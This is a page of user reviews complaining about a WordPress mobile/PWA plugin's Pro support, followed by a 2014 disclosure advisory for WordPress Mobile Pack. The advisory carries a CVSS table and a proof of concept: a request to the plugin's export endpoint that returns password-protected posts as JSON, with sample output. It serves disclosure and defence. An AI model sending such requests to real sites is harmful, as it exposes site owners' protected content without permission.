I love the idea of this plugin, and have been building some other PWA stuff – I was using this on a fairly big site, bought the pro version for $250 or around there, and have a couple issues, and have contacted them 4 or 5 times with no response. Super cool when it works, but a few small but important issues (like code showing up in headlines and no search feature…really?) went unanswered so I uninstalled and now consider it a waste of money. Too bad…PWAs are the stuff of the future and I love the way this works, but I’m seriously disappointed in the lack of company response to my issues.
I give the two stars for the design and basic function, but -3 for the support. If they got these couple small issues ironed out I would reinstall and give 5-stars easily…but they must have bigger fish to fry.

I came across this plugin when I needed a solution to my problem (I needed a site that could work on pc and mobile seamlessly). With a few tweaks here and there, it beautifully solves the hassle of having a mobile site, providing awesome themes for every need.
\*Awesome support included.

Developer never contacted us, so much for Pro support,
Still have multiple pages not working.
Avoid this plugin
Was finally contacted by developer and PRO is now loaded…
There are still minor issues with pages but expecting the developer to contact us shortly to sort this out

## Advisory:

# Information disclosure vulnerability in WordPress Mobile Pack allows anybody to read password protected posts

## Vulnerability

Last revised: August 18, 2014

WordPress Mobile Pack contains a PHP file which allows anybody – authenticated or otherwise – to read all public and password protected posts (draft and private posts appear not to be affected).

Current state:
 Fixed

## CVSS Summary

CVSS base scores for this vulnerability
| Score 5 Medium | |
| --- | --- |
| Vector | Network |
| Complexity | Low |
| Authentication | None |
| Confidentiality | Partial |
| Integrity | None |
| Availability | None |

You can read more about CVSS base scores on [Wikipedia](http://en.wikipedia.org/wiki/CVSS) or in the [CVSS specification](http://www.first.org/cvss/cvss-guide).

## Proof of concept

1. Create a password-protected post
2. Enable WordPress Mobile Pack
3. Visit http://localhost/wp-content/plugins/wordpress-mobile-pack/export/content.php?content=exportarticles&callback=x
4. Your password-protected post is now visible to everybody in the form of JSON wrapped in “x()”

Example output:

```
x (
    {
        "articles": [
            {
                "id": 849,
                "title": "Secret post",
                "timestamp": 1406231170,
                "author": "admin",
                "date": "Thu, Jul 24, 2014, 19:46",
                "link": "http://wp.local/?p=849",
                "image": "",
                "description": "<p>HUSH THIS IS A SECRET</p>n",
                "content": "",
                "category_id": 1,
                "category_name": "Uncategorized"
            }
        ]
    }
)
```
